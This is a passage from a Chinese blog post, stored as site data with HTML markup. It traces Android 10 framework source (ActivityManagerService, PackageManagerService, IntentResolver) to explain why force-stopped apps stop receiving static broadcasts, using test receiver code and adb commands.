intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"comment\">// Figure out who all will receive this broadcast.</span></span><br><span class=\"line\">      <span class=\"type\">List</span> <span class=\"variable\">receivers</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      List&lt;BroadcastFilter&gt; registeredReceivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"comment\">// Need to resolve the intent to interested receivers...</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((intent.getFlags()&amp;Intent.FLAG_RECEIVER_REGISTERED_ONLY)</span><br><span class=\"line\">               == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          receivers = collectReceiverComponents(intent, resolvedType, callingUid, users);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，起手就是new Intent(intent)，为什么不直接使用参数中的intent来进行后续操作呢？此处一个小细节可以看出源码逻辑的谨慎，去查Intent的构造方法就知道，这是对入参的拷贝，避免被其他线程修改。<br>然后最关键的便是下面的 <code>FLAG_EXCLUDE_STOPPED_PACKAGES</code> ，注释也写得很清楚，即<strong>广播发送会排除（exclude）已停止运行的进程</strong>。</p>\n<p>但我初次分析时看了半天没发现是怎么排除的，于是找这个flag引用的地方，在 <strong>Intent</strong> 源码中发现一个方法，判断该intent是否要排除已停止的进程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isExcludingStopped</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (mFlags&amp;(FLAG_EXCLUDE_STOPPED_PACKAGES|FLAG_INCLUDE_STOPPED_PACKAGES))</span><br><span class=\"line\">            == FLAG_EXCLUDE_STOPPED_PACKAGES;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>非常好，我们直接查 <code>isExcludingStopped</code> 方法的引用，发现在 <strong>IntentResolver</strong> 中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">buildResolveList</span><span class=\"params\">(Intent intent, FastImmutableArraySet&lt;String&gt; categories,</span></span><br><span class=\"line\"><span class=\"params\">          <span class=\"type\">boolean</span> debug, <span class=\"type\">boolean</span> defaultOnly, String resolvedType, String scheme,</span></span><br><span class=\"line\"><span class=\"params\">          F[] src, List&lt;R&gt; dest, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">excludingStopped</span> <span class=\"operator\">=</span> intent.isExcludingStopped();</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;N &amp;&amp; (filter=src[i]) != <span class=\"literal\">null</span>; i++) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// ...</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (excludingStopped &amp;&amp; isFilterStopped(filter, userId)) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (debug) &#123;</span><br><span class=\"line\">                  Slog.v(TAG, <span class=\"string\">&quot;  Filter&#x27;s target is stopped; skipping&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是通过intent构造resolve列表的一个私有方法，代码也非常清晰，此判断逻辑 <code>excludingStopped &amp;&amp; isFilterStopped</code> 过滤了最后要启动的组件。其中 <code>isFilterStopped</code> 是真正判断进程是否已停止的方法，而 <strong>excludingStopped</strong> 是我们刚才传入的flag对应的控制标识。所以要过滤掉已停止进程有两个必要条件，<strong>一是这个进程真的死了，二是开发者要通过flag来声明确实需要过滤</strong>（是不是超人性化哈哈哈）。</p>\n<p>因此，我们也可以声明不需要过滤，即给intent设置 <code>FLAG_EXCLUDE_STOPPED_PACKAGES</code> 的兄弟flag：<code>FLAG_INCLUDE_STOPPED_PACKAGES</code> （注意是 <strong>include</strong>），这样在发送广播时，即便是已停止的进程，也能接收到了。这就是上古时期通过广播唤醒死亡进程的方法，现在基本上被各大ROM厂商给优化没了，一般都是三方应用被禁，系统应用依然可以。</p>\n<p>分析到此，其实只是有头有尾，但没有中间过程，<code>broadcastIntentLocked</code> 最终怎么就调到了 <code>buildResolveList</code> 呢？<br>我们回到上面的 <code>broadcastIntentLocked</code> 方法，其中的 <code>receivers</code> 对象存储的是静态广播的集合，<code>registeredReceivers</code> 则是动态广播的集合。我们只看静态广播即可，它来自于 <code>collectReceiverComponents</code> 方法，此方法最后返回的receiver肯定是被过滤后的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">collectReceiverComponents</span><span class=\"params\">(Intent intent, String resolvedType,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">int</span> callingUid, <span class=\"type\">int</span>[] users)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    List&lt;ResolveInfo&gt; receivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> user : users) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            List&lt;ResolveInfo&gt; newReceivers = AppGlobals.getPackageManager()</span><br><span class=\"line\">                    .queryIntentReceivers(intent, resolvedType, pmFlags, user).getList();</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (newReceivers != <span class=\"literal\">null</span> &amp;&amp; newReceivers.size() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                newReceivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (receivers == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                receivers = newReceivers;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RemoteException ex) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// pm is in same process, this will never happen.</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> receivers;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个方法内部逻辑较为简单，我们可以看到最终receivers的来源便是那个 <code>queryIntentReceivers</code> 方法，此方法实现在PMS（PackageManagerService）里面：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@NonNull</span> ParceledListSlice&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntentReceivers</span><span class=\"params\">(Intent intent,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ParceledListSlice</span>&lt;&gt;(</span><br><span class=\"line\">            queryIntentReceiversInternal(intent, resolvedType, flags, userId,</span><br><span class=\"line\">                    <span class=\"literal\">false</span> <span class=\"comment\">/*allowDynamicSplits*/</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"meta\">@NonNull</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntentReceiversInternal</span><span class=\"params\">(Intent intent,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId, <span class=\"type\">boolean</span> allowDynamicSplits)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mPackages) &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">pkgName</span> <span class=\"operator\">=</span> intent.getPackage();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pkgName == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> List&lt;ResolveInfo&gt; result =</span><br><span class=\"line\">                    mComponentResolver.queryReceivers(intent, resolvedType, flags, userId);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> applyPostResolutionFilter(</span><br><span class=\"line\">                    result, instantAppPkgName, allowDynamicSplits, callingUid, <span class=\"literal\">false</span>, userId,</span><br><span class=\"line\">                    intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> PackageParser.<span class=\"type\">Package</span> <span class=\"variable\">pkg</span> <span class=\"operator\">=</span> mPackages.get(pkgName);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pkg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> List&lt;ResolveInfo&gt; result = mComponentResolver.queryReceivers(</span><br><span class=\"line\">                    intent, resolvedType, flags, pkg.receivers, userId);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> applyPostResolutionFilter(</span><br><span class=\"line\">                    result, instantAppPkgName, allowDynamicSplits, callingUid, <span class=\"literal\">false</span>, userId,</span><br><span class=\"line\">                    intent);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最终receiver集合的查询操作在私有方法中，由 <code>mComponentResolver.queryReceivers</code> 得来，似乎越来越接近真相了，马上查看ComponentResolver：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;ResolveInfo&gt; <span class=\"title function_\">queryReceivers</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mReceivers.queryIntent(intent, resolvedType, flags, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;ResolveInfo&gt; <span class=\"title function_\">queryReceivers</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">        List&lt;PackageParser.Activity&gt; receivers, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mReceivers.queryIntentForPackage(intent, resolvedType, flags, receivers, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里正好对应上面的两个不同情况下的调用，它们最终都会调用到 <code>queryIntent</code> 方法，此方法在ComponentResolver的一个静态内部类ActivityIntentResolver中实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ActivityIntentResolver</span></span><br><span class=\"line\">        <span class=\"keyword\">extends</span> <span class=\"title class_\">IntentResolver</span>&lt;PackageParser.ActivityIntentInfo, ResolveInfo&gt; &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType,</span></span><br><span class=\"line\"><span class=\"params\">            <span class=\"type\">boolean</span> defaultOnly, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.queryIntent(intent, resolvedType, defaultOnly, userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    List&lt;ResolveInfo&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">            <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.queryIntent(intent, resolvedType,</span><br><span class=\"line\">                (flags &amp; PackageManager.MATCH_DEFAULT_ONLY) != <span class=\"number\">0</span>,</span><br><span class=\"line\">                userId);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>内部类的中的 <code>queryIntent</code> 方法只是做了一些参数处理，进一步调用的是父类的实现，这个父类也就是起初我们提到的 <strong>IntentResolver</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">public</span> List&lt;R&gt; <span class=\"title function_\">queryIntent</span><span class=\"params\">(Intent intent, String resolvedType, <span class=\"type\">boolean</span> defaultOnly,</span></span><br><span class=\"line\"><span class=\"params\">          <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (firstTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, firstTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (secondTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, secondTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (thirdTypeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, thirdTypeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (schemeCut != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          buildResolveList(intent, categories, debug, defaultOnly, resolvedType,</span><br><span class=\"line\">                  scheme, schemeCut, finalList, userId);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      filterResults(finalList);</span><br><span class=\"line\">      sortResults(finalList);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> finalList;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>看上面的 <code>buildResolveList</code> 方法，照应了开头分析的结果。最终返回的 <strong>finalList</strong> 也就是过滤之后的receiver集合。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>在广播发送的前序步骤（位于AMS）里，通过 <code>intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);</code> 设置了标识，以声明广播不发给已停止的进程，层层调用后最终在 <strong>IntentResolver</strong> 的 <code>buildResolveList</code> 方法中实现过滤。</li>\n<li>在原生Android的设计逻辑中，若要突破上述限制，在 <code>sendBroadcast</code> 之前，给intent添加 flag：<code>FLAG_INCLUDE_STOPPED_PACKAGES</code> 即可。但鉴于各ROM厂商的正负优化，这个操作已经不适用了。</li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a>发现</h3><p>我们先随便实现一个BroadcastReceiver，静态注册：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestReceiver</span> : <span class=\"type\">BroadcastReceiver</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onReceive</span><span class=\"params\">(context: <span class=\"type\">Context</span>?, intent: <span class=\"type\">Intent</span>?)</span></span> &#123;</span><br><span class=\"line\">        Log.w(<span class=\"string\">&quot;TEST-1&quot;</span>, <span class=\"string\">&quot;onReceive <span class=\"subst\">$&#123;intent?.action&#125;</span>&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.TestReceiver&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;com.xxx.yyy.action_test_receiver&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其他诸如Activity什么的就不写了哈，然后我们启动这个测试App之后，用adb命令发一条广播：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell am broadcast -p com.xxx.yyy -a com.xxx.yyy.action_test_receiver</span><br></pre></td></tr></table></figure>\n\n<p>其中参数p表示广播接收所在进程包名，a表示action。命令执行后终端会输出：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Broadcasting: Intent &#123; act=com.xxx.yyy.action_test_receiver flg=0x400000 pkg=com.xxx.yyy &#125;</span><br><span class=\"line\">Broadcast completed: result=0</span><br></pre></td></tr></table></figure>\n\n<p>然后查看logcat，我们可以如愿以偿地看到onReceive中的log。接下来我们杀掉进程，任意方式均可，这里我还是用adb命令，方便：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell am force-stop com.xxx.yyy</span><br></pre></td></tr></table></figure>\n\n<p>杀进程后，再重复上面的广播发送命令，就会发现收不到广播了。这是为什么呢？表面看来这个问题很弱智，进程都死了当然不能再搞事。但实际上背后的逻辑还是值得探索的，系统也不是想象中那么简单地直接判断进程死活然后决定广播发送。</p>\n<h3 id=\"探秘\"><a href=\"#探秘\" class=\"headerlink\" title=\"探秘\"></a>探秘</h3><p>很显然我们要搞明白广播发送的底层逻辑。这里主要分析Framework层面的源码（基于Android 10），涉及到的关键类：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frameworks/base/core/java/android/content/Intent.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/pm/ComponentResolver.java</span><br><span class=\"line\">frameworks/base/services/core/java/com/android/server/IntentResolver.java</span><br></pre></td></tr></table></figure>\n\n<p>关于广播发送的细节，可以参考此文：<a href=\"https://www.jianshu.com/p/c5323a22f3f3\">https://www.jianshu.com/p/c5323a22f3f3</a>，虽然源码版本不是最新，但基本逻辑差异不大，时序图也画得非常清晰。下面我们只针对文题简单地分析关键路径即可。</p>\n<p>当我们乐呵呵地调用了 <code>sendBroadcast</code> 方法之后，会调用到AMS（ActivityManagerService）的 <code>broadcastIntent</code> 方法，进而调用内部的 <code>broadcastIntentLocked</code> 方法（此处插入一个题外话：很多同学可能经常见到源码里 <code>xxxLocked</code> 这种方法，这个locked是什么意思呢？顾名思义就是加锁咯，即你要调用这些locked后缀的方法时，必须保证是线程安全的，所以一般就会看到synchronize关键字，这也算是AOSP的编码规范吧）。</p>\n<p>由于 <code>broadcastIntentLocked</code> 方法非常长，我们只截取关键片段：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"title function_\">broadcastIntentLocked</span><span class=\"params\">(Intent intent<span class=\"comment\">/*省略18个参数*/</span>)</span> &#123;</span><br><span class=\"line\">      intent = <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>(intent);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"comment\">// By default broadcasts do not go to stopped apps.</span></span><br><span class=\"line\">      intent.addFlags(Intent.FLAG_EXCLUDE_STOPPED_PACKAGES);</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"comment\">// Figure out who all will receive this broadcast.</span></span><br><span class=\"line\">      <span class=\"type\">List</span> <span class=\"variable\">receivers</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">      List&lt;BroadcastFilter&gt; registeredReceivers = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      <span class=\"comment\">// Need to resolve the intent to interested receivers...</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((intent.getFlags()&amp;Intent.FLAG_RECEIVER_REGISTERED_ONLY)</span><br><span class=\"line\">               == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">          receivers = collectReceiverComponents(intent, resolvedType, callingUid, users);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，起手就是new Intent(intent)，为什么不直接使用参数中的intent来进行后续操作呢？此处一个小细节可以看出源码逻辑的谨慎，去查Intent的构造方法就知道，这是对入参的拷贝，避免被其他线程修改。<br>然后最关键的便是下面的 <code>FLAG_EXCLUDE_STOPPED_PACKAGES</code> ，注释也写得很清楚，即<strong>广播发送会排除（exclude）已停止运行的进程</strong>。</p>\n<p>但我初次分析时看了半天没发现是怎么排除的，于是找这个flag引用的地方，在 <strong>Intent</strong> 源码中发现一个方法，判断该intent是否要排除已停止的进程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isExcludingStopped</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (mFlags&amp;(FLAG_EXCLUDE_STOPPED_PACKAGES|FLAG_INCLUDE_STOPPED_PACKAGES))</span><br><span class=\"line\">            == FLAG_EXCLUDE_STOPPED_PACKAGES;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>非常好，我们直接查 <code>isExcludingStopped</code> 方法的引用，发现在 <strong>IntentResolver</strong> 中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 